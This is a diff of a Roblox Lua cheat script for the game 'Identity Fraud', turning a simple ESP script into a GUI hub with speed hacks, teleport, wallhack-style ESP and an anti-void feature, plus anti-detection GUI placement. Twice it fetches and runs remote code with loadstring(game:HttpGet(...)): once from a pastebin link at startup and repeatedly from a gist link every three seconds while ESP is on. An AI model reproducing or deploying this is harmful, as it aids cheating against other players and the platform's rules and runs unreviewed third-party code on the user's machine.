@@ -1,104 +1,486 @@
 -- =====================================================================
--- [[ ESP IDENTITY FRAUD - SEM LOOP (EXECUÇÃO ÚNICA) ]]
+-- [[ IDENTITY FRAUD CONTROLL - COMPACT & PREMIUM EDITION ]]
 -- =====================================================================
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local Workspace = game:GetService("Workspace")
 
-local localSeguro
-local ok, coregui = pcall(function() return game:GetService("CoreGui") end)
-if ok and coregui then
-    localSeguro = coregui
+-- ANTI-DETECTION/GUI BLOCK SYSTEM
+local guiParent
+if gethui then
+    guiParent = gethui()
 else
-    localSeguro = LocalPlayer:WaitForChild("PlayerGui")
+    local success, coreGui = pcall(function() return game:GetService("CoreGui") end)
+    guiParent = success and coreGui or LocalPlayer:WaitForChild("PlayerGui")
 end
 
-local nomesMonstros = {
-    ["fraud"] = true,
-    ["stan"] = true,
-    ["ralph"] = true,
-    ["alice"] = true,
-    ["frag"] = true,
-    ["massacre"] = true,
-    ["identity"] = true
+if not guiParent then return end
+
+-- Clear previous versions to prevent overlapping bugs
+local existingGui = guiParent:FindFirstChild("DeltaUtilityHubPremium")
+if existingGui then existingGui:Destroy() end
+
+-- Global Variables
+_G.WalkSpeedValue = _G.WalkSpeedValue or 16
+_G.TargetTeleportPos = nil
+_G.ESP_Enabled = false
+_G.AntiVoid_Enabled = false
+
+-- ==========================================
+-- 1. SECURE EXTERNAL LOADER
+-- ==========================================
+local function loadExternalScript()
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/TxtihXPH"))()
+        end)
+    end)
+end
+loadExternalScript()
+
+-- ==========================================
+-- 2. GUI CREATION & COLOR PALETTE
+-- ==========================================
+local UI = Instance.new("ScreenGui")
+UI.Name = "DeltaUtilityHubPremium"
+UI.ResetOnSpawn = false
+UI.Parent = guiParent
+
+local Colors = {
+    Background = Color3.fromRGB(25, 25, 30),
+    CardBg = Color3.fromRGB(35, 35, 42),
+    TopBar = Color3.fromRGB(38, 38, 46),
+    Accent = Color3.fromRGB(255, 204, 0),
+    InputBg = Color3.fromRGB(20, 20, 24),       
+    Text = Color3.fromRGB(230, 230, 235),
+    Divider = Color3.fromRGB(55, 55, 65),
+    Success = Color3.fromRGB(60, 180, 120),     
+    Danger = Color3.fromRGB(220, 80, 80),       
+    Warning = Color3.fromRGB(240, 150, 50),     
+    Purple = Color3.fromRGB(150, 100, 220),
 }
 
-local function limparESPTotal()
-    if _G.Delta_ESP_Folder then
-        _G.Delta_ESP_Folder:Destroy()
-        _G.Delta_ESP_Folder = nil
-    end
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p.Character then
-            local hl = p.Character:FindFirstChild("Delta_BordaHighlight")
-            if hl then hl:Destroy() end
-        end
-    end
-    for _, obj in ipairs(Workspace:GetChildren()) do
-        local hl = obj:FindFirstChild("Delta_BordaHighlight")
-        if hl then hl:Destroy() end
-    end
+-- Floating Button
+local OpenBtn = Instance.new("ImageButton", UI)
+OpenBtn.Size = UDim2.new(0, 42, 0, 42)
+OpenBtn.Position = UDim2.new(0, 15, 0, 15)
+OpenBtn.BackgroundColor3 = Colors.CardBg
+OpenBtn.Image = "rbxassetid://10493353406"
+OpenBtn.ScaleType = Enum.ScaleType.Fit
+OpenBtn.Visible = false
+OpenBtn.Draggable = true
+local OpenBtnCorner = Instance.new("UICorner", OpenBtn)
+OpenBtnCorner.CornerRadius = UDim.new(1, 0)
+local OpenBtnStroke = Instance.new("UIStroke", OpenBtn)
+OpenBtnStroke.Color = Colors.Accent
+OpenBtnStroke.Thickness = 2
+
+-- Main Window
+local MainFrame = Instance.new("Frame", UI)
+MainFrame.Size = UDim2.new(0, 280, 0, 380)
+MainFrame.Position = UDim2.new(0.5, -140, 0.5, -190)
+MainFrame.BackgroundColor3 = Colors.Background
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.BorderSizePixel = 0
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 8)
+
+-- ==========================================
+-- 3. HEADER
+-- ==========================================
+local TopBar = Instance.new("Frame", MainFrame)
+TopBar.Size = UDim2.new(1, 0, 0, 35)
+TopBar.BackgroundColor3 = Colors.TopBar
+Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 8)
+
+local FixCorner = Instance.new("Frame", TopBar)
+FixCorner.Size = UDim2.new(1, 0, 0, 8)
+FixCorner.Position = UDim2.new(0, 0, 1, -8)
+FixCorner.BackgroundColor3 = Colors.TopBar
+FixCorner.BorderSizePixel = 0
+
+local Title = Instance.new("TextLabel", TopBar)
+Title.Size = UDim2.new(1, -50, 1, 0)
+Title.Position = UDim2.new(0, 12, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "Identity fraud controll"
+Title.TextColor3 = Colors.Text
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 13
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+local TopLine = Instance.new("Frame", MainFrame)
+TopLine.Size = UDim2.new(1, 0, 0, 2)
+TopLine.Position = UDim2.new(0, 0, 0, 35)
+TopLine.BackgroundColor3 = Colors.Accent
+TopLine.BorderSizePixel = 0
+
+local MinimizeBtn = Instance.new("TextButton", TopBar)
+MinimizeBtn.Size = UDim2.new(0, 24, 0, 24)
+MinimizeBtn.Position = UDim2.new(1, -30, 0, 5)
+MinimizeBtn.BackgroundColor3 = Colors.Danger
+MinimizeBtn.Text = "—"
+MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeBtn.Font = Enum.Font.GothamBold
+MinimizeBtn.TextSize = 12
+MinimizeBtn.AutoButtonColor = true
+Instance.new("UICorner", MinimizeBtn).CornerRadius = UDim.new(0, 4)
+
+MinimizeBtn.MouseButton1Click:Connect(function()
+    MainFrame.Visible = false
+    OpenBtn.Visible = true
+end)
+OpenBtn.MouseButton1Click:Connect(function()
+    OpenBtn.Visible = false
+    MainFrame.Visible = true
+end)
+
+-- ==========================================
+-- 4. SCROLLING CATALOG
+-- ==========================================
+local Scroll = Instance.new("ScrollingFrame", MainFrame)
+Scroll.Size = UDim2.new(1, 0, 1, -37)
+Scroll.Position = UDim2.new(0, 0, 0, 37)
+Scroll.BackgroundTransparency = 1
+Scroll.ScrollBarThickness = 3
+Scroll.ScrollBarImageColor3 = Colors.Accent
+Scroll.BorderSizePixel = 0
+Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+
+local ScrollLayout = Instance.new("UIListLayout", Scroll)
+ScrollLayout.SortOrder = Enum.SortOrder.LayoutOrder
+ScrollLayout.Padding = UDim.new(0, 10)
+ScrollLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local ScrollPadding = Instance.new("UIPadding", Scroll)
+ScrollPadding.PaddingTop = UDim.new(0, 10)
+ScrollPadding.PaddingBottom = UDim.new(0, 15)
+
+ScrollLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    Scroll.CanvasSize = UDim2.new(0, 0, 0, ScrollLayout.AbsoluteContentSize.Y + 25)
+end)
+
+-- ==========================================
+-- 5. UI COMPONENTS (CARDS)
+-- ==========================================
+local function createCard(parent, title, color, height)
+    local card = Instance.new("Frame", parent)
+    card.Size = UDim2.new(1, -20, 0, height)
+    card.BackgroundColor3 = Colors.CardBg
+    card.BorderSizePixel = 0
+    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 6)
+
+    local list = Instance.new("UIListLayout", card)
+    list.SortOrder = Enum.SortOrder.LayoutOrder
+    list.Padding = UDim.new(0, 8)
+    list.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+    local pad = Instance.new("UIPadding", card)
+    pad.PaddingTop = UDim.new(0, 8)
+    pad.PaddingBottom = UDim.new(0, 8)
+
+    local titleLbl = Instance.new("TextLabel", card)
+    titleLbl.Size = UDim2.new(1, -16, 0, 16)
+    titleLbl.BackgroundTransparency = 1
+    titleLbl.Text = title
+    titleLbl.TextColor3 = color
+    titleLbl.Font = Enum.Font.GothamBold
+    titleLbl.TextSize = 12
+    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
+
+    local div = Instance.new("Frame", card)
+    div.Size = UDim2.new(1, -16, 0, 1)
+    div.BackgroundColor3 = Colors.Divider
+    div.BorderSizePixel = 0
+
+    return card
 end
 
--- Limpa execuções antigas antes de aplicar a nova
-limparESPTotal()
+local function createInput(parent, placeholder)
+    local box = Instance.new("TextBox", parent)
+    box.BackgroundColor3 = Colors.InputBg
+    box.PlaceholderText = placeholder
+    box.Text = ""
+    box.TextColor3 = Colors.Text
+    box.PlaceholderColor3 = Color3.fromRGB(110, 110, 120)
+    box.Font = Enum.Font.Gotham
+    box.TextSize = 12
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 4)
+    return box
+end
 
-local espFolder = Instance.new("Folder")
-espFolder.Name = "Delta_ESP_System"
-espFolder.Parent = localSeguro
-_G.Delta_ESP_Folder = espFolder
+local function createButton(parent, text, color)
+    local btn = Instance.new("TextButton", parent)
+    btn.BackgroundColor3 = color
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 12
+    btn.AutoButtonColor = true
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
+    return btn
+end
 
-local function aplicarEfeitoESP(char, nomeExibido, cor)
-    local head = char:FindFirstChild("Head")
+-- ==========================================
+-- CARD 1: MOVEMENT
+-- ==========================================
+local SpeedCard = createCard(Scroll, "🏃 SPEED & MOVEMENT", Colors.Success, 105)
+
+local SpeedRow = Instance.new("Frame", SpeedCard)
+SpeedRow.Size = UDim2.new(1, -16, 0, 28)
+SpeedRow.BackgroundTransparency = 1
+
+local SpeedInput = createInput(SpeedRow, " Enter Speed...")
+SpeedInput.Size = UDim2.new(0.65, -4, 1, 0)
+
+local ApplySpeedBtn = createButton(SpeedRow, "Apply", Colors.Success)
+ApplySpeedBtn.Size = UDim2.new(0.35, 0, 1, 0)
+ApplySpeedBtn.Position = UDim2.new(0.65, 4, 0, 0)
+
+ApplySpeedBtn.MouseButton1Click:Connect(function()
+    local num = tonumber(SpeedInput.Text:match("%d+"))
+    if num then
+        _G.WalkSpeedValue = num
+        SpeedInput.Text = " " .. num .. " (Applied)"
+        task.wait(1)
+        SpeedInput.Text = ""
+    end
+end)
+
+local PresetRow = Instance.new("Frame", SpeedCard)
+PresetRow.Size = UDim2.new(1, -16, 0, 24)
+PresetRow.BackgroundTransparency = 1
+
+local LayoutPresets = Instance.new("UIListLayout", PresetRow)
+LayoutPresets.FillDirection = Enum.FillDirection.Horizontal
+LayoutPresets.Padding = UDim.new(0, 4)
+
+local function addPreset(nome, valor, color)
+    local btn = createButton(PresetRow, nome, color)
+    btn.Size = UDim2.new(0.33, -2, 1, 0)
+    btn.TextSize = 11
+    btn.MouseButton1Click:Connect(function()
+        _G.WalkSpeedValue = valor
+        SpeedInput.Text = " Speed: " .. valor
+    end)
+end
+
+addPreset("Default", 16, Color3.fromRGB(60, 100, 80))
+addPreset("Fast", 40, Colors.Warning)
+addPreset("Flash", 120, Colors.Danger)
+
+-- ==========================================
+-- CARD 2: TELEPORT
+-- ==========================================
+local TpCard = createCard(Scroll, "📍 WORLD TELEPORT", Colors.Purple, 110)
+
+local CoordInput = createInput(TpCard, " E.g., 100, 50, -200")
+CoordInput.Size = UDim2.new(1, -16, 0, 28)
+
+local TpRow = Instance.new("Frame", TpCard)
+TpRow.Size = UDim2.new(1, -16, 0, 28)
+TpRow.BackgroundTransparency = 1
+
+local SaveBtn = createButton(TpRow, "Save Pos", Color3.fromRGB(80, 80, 95))
+SaveBtn.Size = UDim2.new(0.5, -3, 1, 0)
+
+local TpBtn = createButton(TpRow, "TELEPORT", Colors.Purple)
+TpBtn.Size = UDim2.new(0.5, -3, 1, 0)
+TpBtn.Position = UDim2.new(0.5, 6, 0, 0)
+
+SaveBtn.MouseButton1Click:Connect(function()
+    local char = LocalPlayer.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if root then
+        CoordInput.Text = string.format("%.1f, %.1f, %.1f", root.Position.X, root.Position.Y, root.Position.Z)
+        SaveBtn.Text = "Saved!"
+        task.wait(1)
+        SaveBtn.Text = "Save Pos"
+    end
+end)
+
+TpBtn.MouseButton1Click:Connect(function()
+    local text = CoordInput.Text
+    local split = string.split(text, ",")
+    if #split >= 3 then
+        local x, y, z = tonumber(split[1]), tonumber(split[2]), tonumber(split[3])
+        if x and y and z then
+            _G.TargetTeleportPos = Vector3.new(x, y, z)
+            TpBtn.BackgroundColor3 = Colors.Success
+            TpBtn.Text = "Success!"
+            task.wait(1)
+            TpBtn.BackgroundColor3 = Colors.Purple
+            TpBtn.Text = "TELEPORT"
+        end
+    end
+end)
+
+-- ==========================================
+-- CARD 3: UTILITIES & SCRIPTS (TOGGLES)
+-- ==========================================
+local ExtrasCard = createCard(Scroll, "👻 EXTRAS & SCRIPTS", Colors.Danger, 185)
+
+-- BOTÃO RESTORE TOOL
+local RestoreToolBtn = createButton(ExtrasCard, "🔧 Restore Tool", Color3.fromRGB(60, 140, 100))
+RestoreToolBtn.Size = UDim2.new(1, -16, 0, 28)
+
+RestoreToolBtn.MouseButton1Click:Connect(function()
+    loadExternalScript()
+    RestoreToolBtn.BackgroundColor3 = Colors.Success
+    RestoreToolBtn.Text = "✔️ Tool Restored!"
+    task.wait(1)
+    RestoreToolBtn.BackgroundColor3 = Color3.fromRGB(60, 140, 100)
+    RestoreToolBtn.Text = "🔧 Restore Tool"
+end)
+
+-- BOTÃO CLEAN FRAUD
+local FraudBtn = createButton(ExtrasCard, "🚫 Clean Fraud Vision", Colors.Danger)
+FraudBtn.Size = UDim2.new(1, -16, 0, 28)
+
+FraudBtn.MouseButton1Click:Connect(function()
+    local npcsFolder = workspace:FindFirstChild("NPCs")
+    if npcsFolder then
+        local fraudNPC = npcsFolder:FindFirstChild("Fraud")
+        if fraudNPC then
+            local head = fraudNPC:FindFirstChild("Head")
+            local torso = fraudNPC:FindFirstChild("Torso")
+            
+            if head and head:IsA("BasePart") then 
+                head.Transparency = 1 
+                local face = head:FindFirstChildOfClass("Decal")
+                if face then face.Transparency = 1 end
+            end
+            if torso and torso:IsA("BasePart") then torso.Transparency = 1 end
+            
+            for _, item in ipairs(fraudNPC:GetChildren()) do
+                if item:IsA("Accessory") then item:Destroy() end
+            end
+            
+            FraudBtn.Text = "✔️ Vision Cleaned!"
+            FraudBtn.BackgroundColor3 = Colors.Success
+            task.wait(1.5)
+            FraudBtn.Text = "🚫 Clean Fraud Vision"
+            FraudBtn.BackgroundColor3 = Colors.Danger
+        else
+            FraudBtn.Text = "❌ 'Fraud' not found"
+            task.wait(1.5)
+            FraudBtn.Text = "🚫 Clean Fraud Vision"
+        end
+    else
+        FraudBtn.Text = "❌ 'NPCs' missing"
+        task.wait(1.5)
+        FraudBtn.Text = "🚫 Clean Fraud Vision"
+    end
+end)
+
+-- TOGGLE ESP (SEU CÓDIGO ORIGINAL COM LOOP SEGURO)
+local EspBtn = createButton(ExtrasCard, "👁️ ESP: OFF", Colors.InputBg)
+EspBtn.Size = UDim2.new(1, -16, 0, 28)
+
+EspBtn.MouseButton1Click:Connect(function()
+    _G.ESP_Enabled = not _G.ESP_Enabled
     
-    if head then
-        -- 1. Criação do Texto
-        local tagId = char.Name .. "_Tag"
-        local tag = Instance.new("BillboardGui")
-        tag.Name = tagId
-        tag.AlwaysOnTop = true
-        tag.Size = UDim2.new(0, 100, 0, 30)
-        tag.StudsOffset = Vector3.new(0, 3, 0)
-        tag.Adornee = head
-        tag.Parent = espFolder
-
-        local label = Instance.new("TextLabel", tag)
-        label.BackgroundTransparency = 1
-        label.Size = UDim2.new(1, 0, 1, 0)
-        label.Text = nomeExibido
-        label.TextColor3 = cor
-        label.Font = Enum.Font.GothamBold
-        label.TextSize = 14
-        label.TextStrokeTransparency = 0
-
-        -- 2. Criação da Borda
+    if _G.ESP_Enabled then
+        EspBtn.Text = "👁️ ESP: ON"
+        EspBtn.BackgroundColor3 = Colors.Accent
+        
+        task.spawn(function()
+            while _G.ESP_Enabled do
+                pcall(function()
+                    -- Executa o seu link de ESP
+                    loadstring(game:HttpGet("https://gist.githubusercontent.com/Bananasolooo/7eece37f6f36067ad37730eb5a69226b/raw/09501896b2865fbbeed71b4f333ba4d8847d6fd4/gistfile1.txt"))()
+                end)
+                task.wait(3) -- Loop a cada 3 segundos para atualizar constantemente sem crashar
+            end
+        end)
+    else
+        EspBtn.Text = "👁️ ESP: OFF"
+        EspBtn.BackgroundColor3 = Colors.InputBg
+        
+        -- Sua lógica original de limpeza
         pcall(function()
-            local hl = Instance.new("Highlight")
-            hl.Name = "Delta_BordaHighlight"
-            hl.OutlineColor = cor
-            hl.OutlineTransparency = 0
-            hl.FillTransparency = 1
-            hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-            hl.Adornee = char
-            hl.Parent = char
+            for _, v in pairs(workspace:GetDescendants()) do
+                if v:IsA("Highlight") then v:Destroy() end
+            end
+            for _, v in pairs(game.CoreGui:GetChildren()) do
+                if v:IsA("Folder") and string.find(string.lower(v.Name), "esp") then
+                    v:Destroy()
+                end
+            end
         end)
     end
-end
+end)
 
--- PARTE 1: Escaneia Jogadores Reais (Cor Branca)
-for _, p in ipairs(Players:GetPlayers()) do
-    if p ~= LocalPlayer and p.Character then
-        aplicarEfeitoESP(p.Character, p.Name, Color3.new(1, 1, 1))
-    end
-end
+-- TOGGLE ANTI-VOID
+local AntiVoidBtn = createButton(ExtrasCard, "🛡️ ANTI-VOID: OFF", Colors.InputBg)
+AntiVoidBtn.Size = UDim2.new(1, -16, 0, 28)
 
--- PARTE 2: Escaneia Monstros do Labirinto (Cor Vermelha)
-for _, obj in ipairs(Workspace:GetChildren()) do
-    if obj:IsA("Model") and obj:FindFirstChild("Humanoid") and obj ~= LocalPlayer.Character then
-        local nomeMinusculo = string.lower(obj.Name)
-        if nomesMonstros[nomeMinusculo] then
-            aplicarEfeitoESP(obj, obj.Name:upper() .. " [MONSTRO]", Color3.new(1, 0, 0))
-        end
+AntiVoidBtn.MouseButton1Click:Connect(function()
+    _G.AntiVoid_Enabled = not _G.AntiVoid_Enabled
+    
+    if _G.AntiVoid_Enabled then
+        AntiVoidBtn.Text = "🛡️ ANTI-VOID: ON"
+        AntiVoidBtn.BackgroundColor3 = Colors.Warning
+        
+        task.spawn(function()
+            local Y_LIMIT = -46.419
+            local TP_DESTINATION = Vector3.new(506.219, 5, -516.763)
+            local isTeleporting = false
+            
+            while _G.AntiVoid_Enabled do
+                task.wait(0.05)
+                
+                if not LocalPlayer.Character then continue end
+                local rootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if not rootPart then continue end
+                
+                local currentY = rootPart.Position.Y
+                if currentY <= Y_LIMIT and not isTeleporting then
+                    isTeleporting = true
+                    rootPart.CFrame = CFrame.new(TP_DESTINATION)
+                    rootPart.Anchored = true
+                    
+                    task.spawn(function()
+                        task.wait(5)
+                        if rootPart and rootPart.Parent then 
+                            rootPart.Anchored = false 
+                        end
+                        isTeleporting = false
+                    end)
+                end
+            end
+        end)
+        
+    else
+        AntiVoidBtn.Text = "🛡️ ANTI-VOID: OFF"
+        AntiVoidBtn.BackgroundColor3 = Colors.InputBg
     end
-end
+end)
+
+-- ==========================================
+-- 8. ENGINE LOOP (SPEED/TELEPORT)
+-- ==========================================
+task.spawn(function()
+    while task.wait(0.1) do
+        if not UI or not UI.Parent then break end
+        
+        pcall(function()
+            local char = LocalPlayer.Character
+            if char then
+                local hum = char:FindFirstChildOfClass("Humanoid")
+                if hum and hum.WalkSpeed ~= _G.WalkSpeedValue then
+                    hum.WalkSpeed = _G.WalkSpeedValue
+                end
+                
+                if _G.TargetTeleportPos then
+                    local root = char:FindFirstChild("HumanoidRootPart")
+                    if root then
+                        root.AssemblyLinearVelocity = Vector3.zero
+                        char:PivotTo(CFrame.new(_G.TargetTeleportPos))
+                        _G.TargetTeleportPos = nil
+                    end
+                end
+            end
+        end)
+    end
+end)
